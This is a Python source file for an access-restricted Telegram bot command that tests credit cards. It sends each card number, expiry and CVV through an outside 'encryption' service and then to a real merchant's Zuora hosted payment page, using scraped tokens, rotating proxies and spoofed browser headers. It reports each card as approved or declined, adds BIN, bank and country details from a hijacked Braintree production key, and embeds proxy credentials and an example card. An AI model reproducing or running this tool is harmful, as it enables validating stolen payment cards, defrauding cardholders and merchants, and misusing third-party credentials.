import requests
import random
import uuid
import logging
import re
import json
import time
from datetime import datetime

# Set up logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

AUTHORIZED_USERS = [2104057670, 6827670598, 6490359522, 985410451, 7002368713, 1650751589, 1393039116, 1203900183]

# Proxy configuration
proxy_credentials = [
    'tnapkbnn-rotate:8vsviipgym5g',
    # Add more proxy credentials if available
]
proxy_base = 'p.webshare.io:80'
proxies_list = [
    {
        'http': f'http://{cred}@{proxy_base}/',
        'https': f'http://{cred}@{proxy_base}/'
    } for cred in proxy_credentials
]

# User agents list
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0'
]

# Braintree API headers
braintree_headers = {
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'authorization': 'Bearer production_7bbkkybf_h459dp5mgcbywsdx',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
}

def get_bin_info(card_number, card_month, card_year, card_cvv):
    """Get BIN information from Braintree API"""
    try:
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': str(uuid.uuid4()),  # Generate a unique session ID
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': card_number,
                        'expirationMonth': card_month,
                        'expirationYear': f"20{card_year}",
                        'cvv': card_cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = requests.post('https://payments.braintree-api.com/graphql', headers=braintree_headers, json=json_data)
        response.raise_for_status()
        data = response.json()

        # Extract BIN details from response
        credit_card = data.get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {})
        bin_data = credit_card.get('binData', {})

        return {
            'bin_info': f"{credit_card.get('brandCode', 'N/A')} {'CREDIT' if bin_data.get('debit') == 'NO' else 'DEBIT'}",
            'bank': bin_data.get('issuingBank', 'N/A'),
            'country': bin_data.get('countryOfIssuance', 'N/A')
        }
    except Exception as e:
        logger.error(f"Error getting BIN info from Braintree: {str(e)}")
        return {
            'bin_info': 'N/A',
            'bank': 'N/A',
            'country': 'N/A'
        }

def create_session():
    """Create a fresh session with random proxy and user agent"""
    session = requests.Session()
    
    # Random proxy selection with fallback
    if proxies_list:
        try:
            proxy = random.choice(proxies_list)
            session.proxies.update(proxy)
            logger.debug(f"Using proxy: {proxy['http']}")
        except Exception as e:
            logger.warning(f"Proxy setup failed: {str(e)}. Proceeding without proxy.")
    else:
        logger.debug("No proxies available. Proceeding without proxy.")
    
    # Random user agent
    user_agent = random.choice(user_agents)
    session.headers.update({
        'User-Agent': user_agent,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-GB,en;q=0.9',
        'Origin': 'https://www.zuora.com',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    })
    logger.debug(f"Using user agent: {user_agent}")
    
    return session

async def process_card(cc_number, cc_month, cc_year, cc_cvv):
    """Process the credit card through Zuora's payment gateway"""
    logger.debug("Starting card processing")
    try:
        s = create_session()
        
        # Step 1: Encrypt card details
        url = "https://asianprozyy.us/encrypt/zuora"
        data = {
            "card": f"{cc_number}|{cc_month}|20{cc_year}|{cc_cvv}",
            "ip": "172.16.26.1",
            "field_key": "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwJ+Hg2lIsqVzn0H6l8/riJW0kPpaAxd93lGx9pQKVQNJ2S2UzTi3+opwYv+jvlJIc9U3cxnoN0h4hUl9HsjT5UsnLdzSkEN7n1OPkNETom9rEQSk7OMsGEeq8aIbXPVOCe/Fv2boXBO7Oys7iGiCLK+vdzA1FBCIuRYaSDkEtjc1VnS8+EfuRzrxExznzXiETd2870CcvlEjC2IK0Ya4DskekM/dFHPexpZnPZp3nH6L4KOsdUzzMpfCMsHnB2m2yMD/40hgiyEHfljvOynCtp6BNjh5Ah/zAPiZlqjTxA24Xw75cemIEgRAqix8aTV7kKaQH9KvrOjGOoT0VXzG/wIDAQAB",
            "host": "https://secure.brownstoneresearch.com/"
        }

        headers = {
            "User-Agent": "PostmanRuntime/7.31.1",
            "Content-Type": "application/json"
        }

        logger.debug("Step 1: Encrypting card details")
        response = s.post(url, data=json.dumps(data), headers=headers)
        response.raise_for_status()
        result = response.json()
        encrypted_card = result.get("encryptedCard")
        if not encrypted_card:
            logger.error("Step 1 failed: No encrypted card received")
            return {'error': 'No encrypted card received from encryption service'}
        logger.debug("Step 1 success")

        # Step 2: Submit to Zuora
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.zuora.com',
            'priority': 'u=1, i',
            'referer': 'https://www.zuora.com/apps/PublicHostedPageLite.do?method=requestPage&host=https%3A%2F%2Fsecure.brownstoneresearch.com%2F%3Fcid%3DMKT813113%26eid%3DMKT824477%26assetId%3DAST361178%26page%3D3&fromHostedPage=true&jsVersion=1.3.1&id=2c92a0fd7176f10d017179a367a435c2&signature=CBKVMRpBeW1nqvVM3Uej9zhxElrRP2MuC7dwDTM1XxNnIayIQ4A1MeKpcoZGvAA8DAPxx%2BoPXj1OU4rQeSCY9EyJZN2GmbWKdH3%2BTUSZKmrc4wHMmZ1ICt7VrBbCK10O4R8iToaVUGvu%2F6oT2sy%2BswRfkZrgs%2BVzV7ukulgAgWkqpTgL9Fomi73H2zNwNLTYyJPyLqjAahZbs5Iu5scKQSy9wcBpz3I6JTirI%2FDSOOKGwJnkRvwvHyhkP%2F7UxKelrw3m6WI6fa8FivihCFQBp0YjG0zCHiXjKpJiKm8%2BYVtc1QPMz5rT3wneqTATFdcFc2e%2Fl8hXLdGgDJdmKC9Dyg%3D%3D&tenantId=3820&token=BNxjyC4MMWnqEg2BHVxLgK31cWvth6TK&isZuoraUp=true&style=inline&submitEnabled=false&retainValues=true&field_passthrough1=revamp&countryBlackList=RUS%2CCUB%2CIRN%2CPRK%2CSOM%2CSDN%2CSYR%2CYEM&customizeErrorRequired=true&field_creditCardNumber=&field_cardSecurityCode=&field_creditCardExpirationYear=&field_creditCardExpirationMonth=&zlog_level=warn',
            'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-storage-access': 'active',
            'user-agent': random.choice(user_agents),
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'method': 'submitPage',
            'id': '2c92a0fd7176f10d017179a367a435c2',
            'tenantId': '3820',
            'token': 'xGjPTnHsy2x4I1I5WckN72glRCQxhMlI',
            'signature': 'Qt8t6KnQuUCsugbo1+1d+G+phx4gl7DgPJozBsqFD9eQkOYttG6LF8ACtyZMbnS9mbaX1pg2F100Kp4U1v1A90w0qDpS2DgidLKJAphJ0ZdgurA7TTTiLGcdv9z4/ENP3qz9ID+fy4DuP707eYYx6mScOnZ/mRF2ew0VFFTafVIkzthDhT/6Gbp95d9dEMN1pWOd7hKJ9yg5sRhB/lTf4XrijhLyVan55gQlOhy1QsJBtxmjEROQqlcxckO7CqPeVMg+mJgt03C5yxiPljd8ZRA5ZVvlwtWMLR7YVukkIWKNprwMdHLAxixcs6J+rzCbkayjUKIcClHe4/yfxGxjhw==',
            'paymentGateway': '',
            'field_authorizationAmount': '',
            'field_screeningAmount': '',
            'field_currency': '',
            'field_key': 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwJ+Hg2lIsqVzn0H6l8/riJW0kPpaAxd93lGx9pQKVQNJ2S2UzTi3+opwYv+jvlJIc9U3cxnoN0h4hUl9HsjT5UsnLdzSkEN7n1OPkNETom9rEQSk7OMsGEeq8aIbXPVOCe/Fv2boXBO7Oys7iGiCLK+vdzA1FBCIuRYaSDkEtjc1VnS8+EfuRzrxExznzXiETd2870CcvlEjC2IK0Ya4DskekM/dFHPexpZnPZp3nH6L4KOsdUzzMpfCMsHnB2m2yMD/40hgiyEHfljvOynCtp6BNjh5Ah/zAPiZlqjTxA24Xw75cemIEgRAqix8aTV7kKaQH9KvrOjGOoT0VXzG/wIDAQAB',
            'field_style': 'inline',
            'jsVersion': '1.3.1',
            'field_submitEnabled': 'false',
            'field_callbackFunctionEnabled': '',
            'field_signatureType': '',
            'host': 'https://secure.brownstoneresearch.com/?cid=MKT813113&eid=MKT824477&assetId=AST361178&page=3',
            'encrypted_fields': '#field_ipAddress#field_creditCardNumber#field_cardSecurityCode#field_creditCardExpirationMonth#field_creditCardExpirationYear',
            'encrypted_values': encrypted_card,
            'customizeErrorRequired': 'true',
            'fromHostedPage': 'true',
            'isGScriptLoaded': 'false',
            'is3DSEnabled': '',
            'checkDuplicated': '',
            'captchaRequired': '',
            'captchaSiteKey': '',
            'field_mitConsentAgreementSrc': '',
            'field_mitConsentAgreementRef': '',
            'field_mitCredentialProfileType': '',
            'field_agreementSupportedBrands': '',
            'paymentGatewayType': '',
            'paymentGatewayVersion': '',
            'is3DS2Enabled': '',
            'cardMandateEnabled': '',
            'zThreeDs2TxId': '',
            'threeDs2token': '',
            'threeDs2Sig': '',
            'threeDs2Ts': '',
            'threeDs2OnStep': '',
            'threeDs2GwData': '',
            'doPayment': '',
            'storePaymentMethod': '',
            'documents': '',
            'xjd28s_6sk': '627f82ccf6bf42c8b24bc62a5cb4391d',
            'pmId': '',
            'button_outside_force_redirect': 'false',
            'browserScreenHeight': '900',
            'browserScreenWidth': '1600',
            'field_passthrough1': 'revamp',
            'field_passthrough2': '',
            'field_passthrough3': '',
            'field_passthrough4': '',
            'field_passthrough5': '',
            'field_passthrough6': '',
            'field_passthrough7': '',
            'field_passthrough8': '',
            'field_passthrough9': '',
            'field_passthrough10': '',
            'field_passthrough11': '',
            'field_passthrough12': '',
            'field_passthrough13': '',
            'field_passthrough14': '',
            'field_passthrough15': '',
            'dfp_session_id': '8b42bdc2-0883-4c98-a09a-d37c2620b2d6',
            'field_accountId': '',
            'field_gatewayName': '',
            'field_deviceSessionId': '',
            'field_ipAddress': '',
            'field_useDefaultRetryRule': '',
            'field_paymentRetryWindow': '',
            'field_maxConsecutivePaymentFailures': '',
            'field_creditCardHolderName': 'Mohammed Nehal',
            'field_creditCardType': 'Visa',
            'field_creditCardNumber': '',
            'field_creditCardExpirationMonth': '',
            'field_creditCardExpirationYear': '',
            'field_cardSecurityCode': '',
            'field_creditCardAddress1': 'New York',
            'field_creditCardAddress2': '',
            'field_creditCardCity': 'New York',
            'field_creditCardState': 'New York',
            'field_creditCardPostalCode': '10040',
            'field_creditCardCountry': 'USA',
            'encodedZuoraIframeInfo': 'eyJpc0Zvcm1FeGlzdCI6dHJ1ZSwiaXNGb3JtSGlkZGVuIjpmYWxzZSwienVvcmFFbmRwb2ludCI6Imh0dHBzOi8vd3d3Lnp1b3JhLmNvbS9hcHBzLyIsImZvcm1XaWR0aCI6MzQ4LCJmb3JtSGVpZ2h0Ijo3MjAsImxheW91dFN0eWxlIjoiYnV0dG9uT3V0c2lkZSIsInp1b3JhSnNWZXJzaW9uIjoiMS4zLjEiLCJmb3JtRmllbGRzIjpbeyJpZCI6ImZvcm0tZWxlbWVudC1jcmVkaXRDYXJkVHlwZSIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZE51bWJlciIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZEV4cGlyYXRpb25ZZWFyIiwiZXhpc3RzIjp0cnVlLCJpc0hpZGRlbiI6ZmFsc2V9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkSG9sZGVyTmFtZSIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZENvdW50cnkiLCJleGlzdHMiOnRydWUsImlzSGlkZGVuIjpmYWxzZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmRTdGF0ZSIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZEFkZHJlc3MxIiwiZXhpc3RzIjp0cnVlLCJpc0hpZGRlbiI6ZmFsc2V9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkQWRkcmVzczIiLCJleGlzdHMiOnRydWUsImlzSGlkZGVuIjpmYWxzZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmRDaXR5IiwiZXhpc3RzIjp0cnVlLCJpc0hpZGRlbiI6ZmFsc2V9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkUG9zdGFsQ29kZSIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtcGhvbmUiLCJleGlzdHMiOmZhbHNlLCJpc0hpZGRlbiI6dHJ1ZX0seyJpZCI6ImlucHV0LWVtYWlsIiwiZXhpc3RzIjpmYWxzZSwiaXNIaWRkZW4iOnRydWV9XX0=',
        }

        logger.debug("Step 2: Submitting to Zuora")
        response = s.post('https://www.zuora.com/apps/PublicHostedPageLite.do', headers=headers, data=data)
        response.raise_for_status()
        response_data = response.json()
        
        if 'errorMessage' in response_data:
            return {
                'status': False,
                'message': response_data['errorMessage'],
                'raw_response': response_data
            }
        else:
            return {
                'status': True,
                'message': 'Approved',
                'raw_response': response_data
            }

    except requests.RequestException as e:
        logger.error(f"HTTP request failed: {str(e)}")
        return {'error': f'HTTP request failed: {str(e)}'}
    except ValueError as e:
        logger.error(f"JSON decode error: {str(e)}")
        return {'error': f'JSON decode error: {str(e)}'}
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return {'error': f'Unexpected error: {str(e)}'}

async def check_card_handler(event):
    """Handle the /chk command from Telegram"""
    if event.sender_id not in AUTHORIZED_USERS:
        await event.respond("❌ **Error**: Unauthorized user. Access denied.")
        return
    
    logger.debug("Received /chk command")
    start_time = time.time()
    
    # Extract input using regex
    input_text = event.pattern_match.group(1)
    pattern = r'^(\d{16})\|(\d{1,2})\|(\d{2,4})\|(\d{3})$'
    match = re.match(pattern, input_text)
    
    if not match:
        logger.warning(f"Invalid input format: {input_text}")
        await event.reply("Invalid input format. Use: /chk cc|mm|yy|cvv\nExample: /chk 4207670303764172|02|29|082")
        return
    
    cc_number, cc_month, cc_year, cc_cvv = match.groups()
    
    # Normalize month to 2-digit
    cc_month = cc_month.zfill(2)
    
    # Normalize year to 2-digit
    if len(cc_year) == 4:
        cc_year = cc_year[-2:]

    logger.debug(f"Normalized input: {cc_number}|{cc_month}|{cc_year}|{cc_cvv}")

    
    # Get BIN info using Braintree API
    bin_info = get_bin_info(cc_number, cc_month, cc_year, cc_cvv)
    
    # Process the card
    result = await process_card(cc_number, cc_month, cc_year, cc_cvv)
    processing_time = time.time() - start_time
    
    # Format response
    if 'error' in result:
        logger.error(f"Card processing failed: {result['error']}")
        await event.reply(f"❌ **Error**: {result['error']}")
        return
    
    bold = lambda s: f"**{s}**"
    arrow = "➟"
    
    if result['status']:
        response_text = f"✅ {bold('Approved')}\n\n"
        response_text += f"{bold('Card')} {arrow} {cc_number}|{cc_month}|20{cc_year}|{cc_cvv}\n"
        response_text += f"{bold('Gateway')} {arrow} Zuora+Stripe 1$\n"
        response_text += f"{bold('Response')} {arrow} Approved\n\n"
    else:
        # Trim 'Transaction declined.402 -' from decline message
        decline_message = result['message'].replace('Transaction declined.402 -', '').strip()
        response_text = f"❌ {bold('Declined')}\n\n"
        response_text += f"{bold('Card')} {arrow} {cc_number}|{cc_month}|20{cc_year}|{cc_cvv}\n"
        response_text += f"{bold('Gateway')} {arrow} Zuora+Stripe 1$\n"
        response_text += f"{bold('Response')} {arrow} {decline_message}\n\n"
    response_text += f"{bold('BIN')} {arrow} {bin_info['bin_info']}\n"
    response_text += f"{bold('Bank')} {arrow} {bin_info['bank']}\n"
    response_text += f"{bold('Country')} {arrow} {bin_info['country']}\n"
    response_text += f"{bold('Time')} {arrow} {processing_time:.2f}s"

    await event.reply(response_text)
